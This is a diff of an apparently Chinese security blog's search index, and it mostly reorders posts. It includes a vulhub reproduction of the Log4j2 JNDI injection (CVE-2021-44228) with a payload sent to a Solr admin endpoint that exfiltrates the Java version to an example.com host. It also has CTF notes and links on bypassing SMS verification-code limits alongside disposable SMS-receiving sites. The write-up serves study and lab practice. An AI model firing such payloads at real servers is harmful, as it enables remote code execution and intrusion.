@@ -196,13 +196,13 @@
     <url>/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-漏洞复现"><a href="#CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-漏洞复现" class="headerlink" title="CVE-2021-44228 Apache Log4j2 lookup feature JNDI injection     漏洞复现"></a>CVE-2021-44228 Apache Log4j2 lookup feature JNDI injection     漏洞复现</h1><p>此次复现环境使用的是vulhub</p>
 <h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>首先启用vulhub</p>
-<p><img src="/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-漏洞复现/image-20220709123945520.png" alt="image-20220709123945520"></p>
+<p><img src="/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5Cimage-20220709123945520.png" alt="image-20220709123945520"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:dns://$&#123;sys:java.version&#125;.example.com&#125;是利用JNDI发送DNS请求的Payload，我们将其作为管理员接口的action参数值发送如下数据包：</span><br><span class="line"></span><br><span class="line">GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.example.com&#125; HTTP/1.1</span><br><span class="line">Host: your-ip:8983</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我们可以在DNS日志平台收到相关日志，显示出当前Java版本：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实际利用JNDI注入漏洞，可以使用这个工具。利用完毕后，可见touch /tmp/success已经成功被执行：</span><br></pre></td></tr></table></figure>
 
 
 
 <p>可以看到dnslog平台上面已经有了java版本</p>
-<p><img src="/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-漏洞复现/image-20220709125247095.png" alt="image-20220709125247095"></p>
+<p><img src="/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5Cimage-20220709125247095.png" alt="image-20220709125247095"></p>
 <p><img src="/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5Cimage-20220709125426263.png" alt="image-20220709125426263"></p>
 <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><a href="https://blog.csdn.net/hilaryfrank/article/details/121944757">(88条消息) Log4j2注入漏洞万字剖析-汇总收藏版(攻击步骤、漏洞原理、2.15.0-RC1绕过原理以及2.15.0、2.16.0修复原理)_程序员Daddy的博客-CSDN博客</a></p>
 ]]></content>
@@ -427,22 +427,6 @@
       </categories>
   </entry>
   <entry>
-    <title>bugku做题心得 备份是个好习惯</title>
-    <url>/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/</url>
-    <content><![CDATA[<h4 id="bugku做题心得-备份是个好习惯"><a href="#bugku做题心得-备份是个好习惯" class="headerlink" title="bugku做题心得 备份是个好习惯"></a>bugku做题心得 备份是个好习惯</h4><p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20211108160122664.png" alt="image-20211108160122664"></p>
-<p>函数拓展</p>
-<p>PHP ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。 </p>
-<p>函数格式：string ini_set(string $varname, string $newvalue) </p>
-<p>strstr函数</p>
-<p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/image-20211108160329851.png" alt="image-20211108160329851"></p>
-<p>关于函数str_replace的绕过</p>
-<p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/image-20211108160933783.png" alt="image-20211108160933783"></p>
-]]></content>
-      <categories>
-        <category>-Experience</category>
-      </categories>
-  </entry>
-  <entry>
     <title>bugku—source  用 kali Linux 里面的工具下载git源码</title>
     <url>/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/</url>
     <content><![CDATA[<h1 id="bugku—source-用-kali-Linux-里面的工具下载git源码"><a href="#bugku—source-用-kali-Linux-里面的工具下载git源码" class="headerlink" title="bugku—source  用 kali Linux 里面的工具下载git源码"></a>bugku—source  用 kali Linux 里面的工具下载git源码</h1><p><img src="/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/image-20220104190602170.png" alt="image-20220104190602170"></p>
@@ -464,6 +448,22 @@
 <p>然后用git show （加开头黄色那坨字符串）去一个一个查看</p>
 <p><img src="/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/image-20220104191454285.png" alt="image-20220104191454285"></p>
 <p>发现flag</p>
+]]></content>
+      <categories>
+        <category>-Experience</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>bugku做题心得 备份是个好习惯</title>
+    <url>/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/</url>
+    <content><![CDATA[<h4 id="bugku做题心得-备份是个好习惯"><a href="#bugku做题心得-备份是个好习惯" class="headerlink" title="bugku做题心得 备份是个好习惯"></a>bugku做题心得 备份是个好习惯</h4><p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20211108160122664.png" alt="image-20211108160122664"></p>
+<p>函数拓展</p>
+<p>PHP ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。 </p>
+<p>函数格式：string ini_set(string $varname, string $newvalue) </p>
+<p>strstr函数</p>
+<p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/image-20211108160329851.png" alt="image-20211108160329851"></p>
+<p>关于函数str_replace的绕过</p>
+<p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/image-20211108160933783.png" alt="image-20211108160933783"></p>
 ]]></content>
       <categories>
         <category>-Experience</category>
@@ -2993,6 +2993,22 @@
       </categories>
   </entry>
   <entry>
+    <title>短信验证码接口限制</title>
+    <url>/2022/02/03/%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E6%8E%A5%E5%8F%A3%E9%99%90%E5%88%B6/</url>
+    <content><![CDATA[<h1 id="短信验证码接口限制"><a href="#短信验证码接口限制" class="headerlink" title="短信验证码接口限制"></a>短信验证码接口限制</h1><p>转载几个博客，方便日后查阅</p>
+<p><a href="https://www.cnblogs.com/lovequitepcs/p/12901987.html">几个绕过短信验证码限制的漏洞挖掘 - QuiteX - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://blog.csdn.net/weixin_44549063/article/details/113361313">(38条消息) 如何防止恶意攻击短信验证码接口_newxtc的博客-CSDN博客_如何防止短信验证码攻击</a></p>
+<p><a href="https://www.lx598.com/hangyedongtai/978.html">短信验证码安全常见逻辑漏洞_动力思维 (lx598.com)</a></p>
+<p>更新了几个接码平台</p>
+<p><a href="http://www.z-sms.com/sms-receive-free.php?pho_num=15227789961&amp;1">http://www.z-sms.com/sms-receive-free.php?pho_num=15227789961&amp;1</a></p>
+<p><a href="https://smsreceivefree.com/country/usa">https://smsreceivefree.com/country/usa</a></p>
+<p><a href="https://jiemahao.com/sms/?phone=5">https://jiemahao.com/sms/?phone=5</a></p>
+]]></content>
+      <categories>
+        <category>-penetration</category>
+      </categories>
+  </entry>
+  <entry>
     <title>算法图解</title>
     <url>/2022/01/16/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/</url>
     <content><![CDATA[<h1 id="算法图解"><a href="#算法图解" class="headerlink" title="算法图解"></a>算法图解</h1><h1 id="第一章-算法简介"><a href="#第一章-算法简介" class="headerlink" title="第一章 算法简介"></a>第一章 算法简介</h1><h2 id="1-1认识"><a href="#1-1认识" class="headerlink" title="1.1认识"></a>1.1认识</h2><p>算法是一组完成任务的指令。任何代码片段都可以视为算法。</p>
@@ -3070,22 +3086,6 @@
 ]]></content>
       <categories>
         <category>-readbook</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>短信验证码接口限制</title>
-    <url>/2022/02/03/%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E6%8E%A5%E5%8F%A3%E9%99%90%E5%88%B6/</url>
-    <content><![CDATA[<h1 id="短信验证码接口限制"><a href="#短信验证码接口限制" class="headerlink" title="短信验证码接口限制"></a>短信验证码接口限制</h1><p>转载几个博客，方便日后查阅</p>
-<p><a href="https://www.cnblogs.com/lovequitepcs/p/12901987.html">几个绕过短信验证码限制的漏洞挖掘 - QuiteX - 博客园 (cnblogs.com)</a></p>
-<p><a href="https://blog.csdn.net/weixin_44549063/article/details/113361313">(38条消息) 如何防止恶意攻击短信验证码接口_newxtc的博客-CSDN博客_如何防止短信验证码攻击</a></p>
-<p><a href="https://www.lx598.com/hangyedongtai/978.html">短信验证码安全常见逻辑漏洞_动力思维 (lx598.com)</a></p>
-<p>更新了几个接码平台</p>
-<p><a href="http://www.z-sms.com/sms-receive-free.php?pho_num=15227789961&amp;1">http://www.z-sms.com/sms-receive-free.php?pho_num=15227789961&amp;1</a></p>
-<p><a href="https://smsreceivefree.com/country/usa">https://smsreceivefree.com/country/usa</a></p>
-<p><a href="https://jiemahao.com/sms/?phone=5">https://jiemahao.com/sms/?phone=5</a></p>
-]]></content>
-      <categories>
-        <category>-penetration</category>
       </categories>
   </entry>
   <entry>
